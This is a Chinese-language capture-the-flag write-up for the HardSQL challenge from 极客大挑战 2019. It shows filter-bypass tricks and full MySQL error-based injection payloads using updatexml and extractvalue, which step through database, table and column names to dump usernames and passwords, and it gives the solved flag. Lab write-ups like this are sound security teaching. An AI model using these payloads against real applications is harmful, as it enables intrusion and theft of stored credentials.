# [极客大挑战 2019]HardSQL

## Tag

SQL 报错注入

***

## Writeup

题目有过滤等号，可以用 like 来代替，过滤空格，可以用括号代替，万能密码 `1'or((1)like(1))#` 只有 Login Success：

![image-20260130155437008](../../../../assets/image-20260130155437008.png)

有一个叫做 SQL 报错注入的方式，函数 `updatexml(xml_target, xpath_expression, new_xml)` 是 mysql 对 xml 文档数据进行查询和修改的 xpath 函数，函数 `extractvalue(xml_frag, xpath_expression)` 是 mysql 对 xml 文档数据进行查询的 xpath 函数。

注入原理： 

1. 在使用语句时，如果 xpath_expression 不符合该种类格式，就会出现格式错误，并且会以系统报错的形式提示出错误
2. 局限性查询字符串长度最大为 32 位，要突破此限制可使用 `right(), left(), substr()`来截取字符串

***

### 使用 updatexml

查询数据库：`1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#`（0x7e 表示 ~，是一个非法路径）

![image-20260130154912935](../../../../assets/image-20260130154912935.png)

查询表名：`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#`：

![image-20260130155521409](../../../../assets/image-20260130155521409.png)

查询字段：`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#`

![image-20260130160207048](../../../../assets/image-20260130160207048.png)

查询字段值：`1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#`，只能得到一半：

![image-20260130160258469](../../../../assets/image-20260130160258469.png)

另一半需要通过 right 函数：`1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#`

![image-20260130160333992](../../../../assets/image-20260130160333992.png)

拼接即可得到最终 flag：`flag{79bca528-22e1-44d9-a81f-86e390e93ac8}`（有些重叠需要去掉）

***

### 使用 extractvalue

查询数据库：`1'^extractvalue(1,concat(0x7e,(select(database()))))#`

查询表：`1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#`

查询字段：`1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#`

查询字段值：`1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#` 和 `1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))#`